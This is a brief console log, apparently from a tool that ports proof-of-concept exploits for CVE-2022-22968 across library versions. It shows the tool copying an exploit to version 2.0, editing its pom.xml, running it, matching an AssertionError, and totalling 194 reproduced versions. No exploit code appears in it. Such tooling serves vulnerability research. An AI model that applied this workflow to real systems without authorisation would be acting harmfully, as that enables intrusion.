[96m[Selector] Closest reproduced version: 2.0.1 at index 28[0m
[96m[Adapter] Trying next closest version: 2.0[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0/exploit[0m
[96m[Preparer] Updating dependency version to 2.0 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0[0m
[93m[Selector] No pending versions available.[0m
[91m[Main] No suitable version found for further adaptation. Stopping.[0m
[1m[Main] === Adaptation process complete ===[0m
[92m[Main] Total reproduced versions: 194[0m
